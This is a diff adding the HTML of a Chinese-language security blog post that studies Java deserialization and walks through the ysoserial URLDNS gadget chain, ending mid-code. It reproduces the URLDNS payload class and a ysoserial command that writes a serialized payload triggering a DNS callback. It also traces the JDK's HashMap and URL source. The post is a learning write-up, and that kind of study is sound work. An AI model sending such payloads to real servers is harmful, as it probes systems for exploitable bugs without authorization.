@@ -1,0 +1,735 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mechoy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Java安全-反序列化0x00 前言本篇主要记录一下学习Java反序列化 0x01 反序列化的安全问题产生反序列化正常来说，是不存在安全问题的，但当被反序列化的类(实际上是该类对象的序列化字符串)重写了readObject()时，在反序列化的过程中会**自动执行重写后的readObject()**，此时就存在了一定的安全隐患。 反序列机制引入了在服务端执行代码的可能。 0x02 反序列化可能的利用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化">
+<meta property="og:url" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="Mechoy&#39;s Blog">
+<meta property="og:description" content="Java安全-反序列化0x00 前言本篇主要记录一下学习Java反序列化 0x01 反序列化的安全问题产生反序列化正常来说，是不存在安全问题的，但当被反序列化的类(实际上是该类对象的序列化字符串)重写了readObject()时，在反序列化的过程中会**自动执行重写后的readObject()**，此时就存在了一定的安全隐患。 反序列机制引入了在服务端执行代码的可能。 0x02 反序列化可能的利用">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/9.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/10.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/11.png">
+<meta property="og:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/12.png">
+<meta property="article:published_time" content="2023-03-27T15:40:50.403Z">
+<meta property="article:modified_time" content="2023-03-27T15:40:28.884Z">
+<meta property="article:author" content="Mechoy">
+<meta property="article:tag" content="Java安全">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png">
+  
+  
+  <title>Java反序列化 - Mechoy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Mechoy&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java反序列化"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        Mechoy
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-27 23:40" pubdate>
+          2023年3月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java反序列化</h1>
+            
+            <div class="markdown-body">
+              
+              <h2 id="Java安全-反序列化"><a href="#Java安全-反序列化" class="headerlink" title="Java安全-反序列化"></a>Java安全-反序列化</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>本篇主要记录一下学习Java反序列化</p>
+<h3 id="0x01-反序列化的安全问题产生"><a href="#0x01-反序列化的安全问题产生" class="headerlink" title="0x01 反序列化的安全问题产生"></a>0x01 反序列化的安全问题产生</h3><p>反序列化正常来说，是不存在安全问题的，但当被反序列化的类(实际上是该类对象的序列化字符串)重写了<code>readObject()</code>时，在反序列化的过程中会**自动执行重写后的<code>readObject()</code>**，此时就存在了一定的安全隐患。</p>
+<p>反序列机制引入了在服务端执行代码的可能。</p>
+<h3 id="0x02-反序列化可能的利用方式"><a href="#0x02-反序列化可能的利用方式" class="headerlink" title="0x02 反序列化可能的利用方式"></a>0x02 反序列化可能的利用方式</h3><h4 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h4><p><strong>入口类的<code>readObject()</code>中直接调用危险方法。</strong></p>
+<p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" srcset="/img/loading.gif" lazyload></p>
+<p>重写的<code>readObject()</code>中存在危险方法，但此类情况一般不存在，所以看看就好，知道重写<code>readObject()</code></p>
+<h4 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h4><p><strong>入口类参数中包含可控类，该类有危险方法，<code>readObject()</code>时调用</strong></p>
+<p>此类情况，URLDNS链应该能够很清楚的进行一个说明</p>
+<p>简答描述下URLDNS链，很难造成危害，但用于验证反序列化漏洞是非常好用的，该<code>gadget chains</code>(利用链)使用的全是JDK原生的东西，不需要引入其他的包，故该链用于验证反序列化漏洞确实不错。</p>
+<p>此处先提一下这个工具<a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a>，YYDS</p>
+<p>先来看一下<code>ysoserial</code>给出的URLDNS链的<code>paylaod</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 删掉了一些注释</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ObjectPayload</span>&lt;<span class="hljs-title">Object</span>&gt; </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>        <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>        URLStreamHandler handler = <span class="hljs-keyword">new</span> SilentURLStreamHandler();<br><br>        HashMap ht = <span class="hljs-keyword">new</span> HashMap(); <span class="hljs-comment">// HashMap that will contain the URL</span><br>        URL u = <span class="hljs-keyword">new</span> URL(<span class="hljs-keyword">null</span>, url, handler); <span class="hljs-comment">// URL to use as the Key</span><br>        ht.put(u, url); <span class="hljs-comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span><br><br>        Reflections.setFieldValue(u, <span class="hljs-string">&quot;hashCode&quot;</span>, -<span class="hljs-number">1</span>); <span class="hljs-comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.利用反射更改hashCode的值</span><br><br>        <span class="hljs-keyword">return</span> ht;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        PayloadRunner.run(URLDNS.class, args);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span><br><span class="hljs-comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span><br><span class="hljs-comment">         * using the serialized object.&lt;/p&gt;</span><br><span class="hljs-comment">         *</span><br><span class="hljs-comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span><br><span class="hljs-comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span><br><span class="hljs-comment">         * second resolution.&lt;/p&gt;</span><br><span class="hljs-comment">         */</span><br>    <span class="hljs-comment">// 定义SilentURLStreamHandler继承URLStreamHandler，解决了URL在初始化时发起的DNS请求</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SilentURLStreamHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">URLStreamHandler</span> </span>&#123;<br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> URLConnection <span class="hljs-title">openConnection</span><span class="hljs-params">(URL u)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">synchronized</span> InetAddress <span class="hljs-title">getHostAddress</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>先简单复现一下，有点成就感后才能更深入的学习🎃</p>
+<p>找个DNS在线平台</p>
+<p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" srcset="/img/loading.gif" lazyload></p>
+<p><code>java -jar ysoserial.jar URLDNS &quot;http://spd8w49k8gy7.f43bc91d.dns.1433.eu.org.&quot; &gt; ser.bin</code></p>
+<p>然后把它反序列化下</p>
+<p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" srcset="/img/loading.gif" lazyload></p>
+<p>收到DNS请求，完工、关机、下班😒</p>
+<p>这里收到了两个请求，在反序列化时，是只会进行一次DNS请求的，另一次跟我们关系不大，忽略…</p>
+<p>刚开始以为是序列化的时候一次，反序列化的时候又一次，后面发现不对劲，艹了，不好好看源码的代价🙃</p>
+<p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" srcset="/img/loading.gif" lazyload></p>
+<p>简简单单，看懂了的话，没看懂的话还是有些迷糊</p>
+<p>反向思考一下，作者是如何找到这条利用链的：</p>
+<ol>
+<li>入口类需要重写了<code>readObject()</code></li>
+<li>入口类接收的参数广泛，例如<code>Object</code></li>
+<li>该参数在<code>readObject()</code>中被调用，并且调用了该参数的危险方法或间接的调用了该参数的危险方法</li>
+<li>危险方法能够造成一定的影响</li>
+</ol>
+<p>OK，跟着上面的代码来，直接来到<code>HashMap</code>的<code>readObject()</code></p>
+<p>先走一下正常的<code>HashMap#readObject()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 一个正常的HashMap</span><br>HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>hashMap.put(<span class="hljs-string">&quot;zzz&quot;</span>,<span class="hljs-number">111</span>);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream s)</span></span><br><span class="hljs-function">    <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br><br>    ObjectInputStream.GetField fields = s.readFields();<br><br>    <span class="hljs-comment">// Read loadFactor (ignore threshold)</span><br>    <span class="hljs-keyword">float</span> lf = fields.get(<span class="hljs-string">&quot;loadFactor&quot;</span>, <span class="hljs-number">0.75f</span>);<br>    <span class="hljs-keyword">if</span> (lf &lt;= <span class="hljs-number">0</span> || Float.isNaN(lf))<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal load factor: &quot;</span> + lf);<br><br>    lf = Math.min(Math.max(<span class="hljs-number">0.25f</span>, lf), <span class="hljs-number">4.0f</span>);<br>    HashMap.UnsafeHolder.putLoadFactor(<span class="hljs-keyword">this</span>, lf);<br><br>    reinitialize();<br><br>    s.readInt();                <span class="hljs-comment">// Read and ignore number of buckets</span><br>    <span class="hljs-keyword">int</span> mappings = s.readInt(); <span class="hljs-comment">// Read number of mappings (size)</span><br>    <span class="hljs-keyword">if</span> (mappings &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InvalidObjectException(<span class="hljs-string">&quot;Illegal mappings count: &quot;</span> + mappings);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// use defaults</span><br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (mappings &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">float</span> fc = (<span class="hljs-keyword">float</span>)mappings / lf + <span class="hljs-number">1.0f</span>;<br>        <span class="hljs-keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?<br>                   DEFAULT_INITIAL_CAPACITY :<br>                   (fc &gt;= MAXIMUM_CAPACITY) ?<br>                   MAXIMUM_CAPACITY :<br>                   tableSizeFor((<span class="hljs-keyword">int</span>)fc));<br>        <span class="hljs-keyword">float</span> ft = (<span class="hljs-keyword">float</span>)cap * lf;<br>        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?<br>                     (<span class="hljs-keyword">int</span>)ft : Integer.MAX_VALUE);<br><br>        <span class="hljs-comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span><br>        <span class="hljs-comment">// what we&#x27;re actually creating.</span><br>        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);<br>        <span class="hljs-meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br>        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="hljs-keyword">new</span> Node[cap];<br>        table = tab;<br>		<span class="hljs-comment">// 上面的其实没啥看的，不是验证，就是读取一些必要的字段</span><br>        <span class="hljs-comment">// Read the keys and values, and put the mappings in the HashMap</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;	<span class="hljs-comment">// 开始逐个序列化key和value</span><br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span>		、、<br>            K key = (K) s.readObject();<br>            <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            V value = (V) s.readObject();<br>            putVal(hash(key), key, value, <span class="hljs-keyword">false</span>, <span class="hljs-keyword">false</span>);<span class="hljs-comment">// 此时计算了key的hashCode</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>跟进<code>hash()</code>方法，注意此时传入的key，已知传入的key是一个String类型</p>
+<p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hash</span><span class="hljs-params">(Object key)</span> </span>&#123;	<span class="hljs-comment">// 接收key，作为Object类型</span><br>    <span class="hljs-keyword">int</span> h;<br>    <span class="hljs-keyword">return</span> (key == <span class="hljs-keyword">null</span>) ? <span class="hljs-number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);	<span class="hljs-comment">// 调用key的hashCode()</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此时<code>key</code>实际上是<code>String</code>类型，跟进<code>key.hashCode()</code>，来到<code>String#hashCode()</code></p>
+<p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" srcset="/img/loading.gif" lazyload></p>
+<p>Ok，假如，此时的key时URL类型的，那么就会调用到<code>URL#readObject()</code>，再来看<code>URL#readObject()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (hashCode != -<span class="hljs-number">1</span>)		<span class="hljs-comment">// 已知在new URL时，URL的hashCode=-1，这里需要注意在反序列化时会更改hashCode</span><br>        <span class="hljs-keyword">return</span> hashCode;	<span class="hljs-comment">// 原因是需要保证key的唯一性</span><br><br>    hashCode = handler.hashCode(<span class="hljs-keyword">this</span>);	<span class="hljs-comment">// </span><br>    <span class="hljs-keyword">return</span> hashCode;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>又调用<code>java.net.URLStreamHandler#hashCode()</code>，继续跟进</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">(URL u)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> h = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// Generate the protocol part.</span><br>    String protocol = u.getProtocol();	<span class="hljs-comment">// 获取请求协议</span><br>    <span class="hljs-keyword">if</span> (protocol != <span class="hljs-keyword">null</span>)<br>        h += protocol.hashCode();<br><br>    <span class="hljs-comment">// Generate the host part.</span><br>    InetAddress addr = getHostAddress(u);	<span class="hljs-comment">// 根于域名获取IP地址，也就是发起一次DNS请求，下面的就可以忽略了</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>OK，到这里其实已经比较清晰了，如果<code>hashMap()</code>的<code>key</code>是一个URL对象，并且该对象的<code>hashCode</code>字段为-1,则会发起一次DNS请求。来捋一捋</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Gadget Chain:<br>  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-constructor">Val()</span>	<span class="hljs-comment">// 个人感觉这个算不上利用链中的一条，因为在调用该方法之前已经调用了hash()菜鸡想法，轻点喷</span><br>      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URL</span>.</span></span>hash<span class="hljs-constructor">Code()</span>	<span class="hljs-comment">// 需保证URL的hashCode字段为-1才能进下一步</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">URLStreamHandler</span>.</span></span>hash<span class="hljs-constructor">Code()</span>	<span class="hljs-comment">// 此处调用URLStreamHandler.getHostAddress发送DNS请求</span><br></code></pre></td></tr></table></figure>
+
+<p>先来看一下在序列化之后URL的<code>hashCode</code>字段的值</p>
+<p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>为啥呢，因为在<code>put()</code>时，调用了<code>URL.hashCode()</code>对其<code>hashCode</code>的值进行了计算</p>
+<p><img src="/2023/03/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" srcset="/img/loading.gif" lazyload></p>
+<p>到此，算是基本完工，可以根据上面的来写代码了</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span 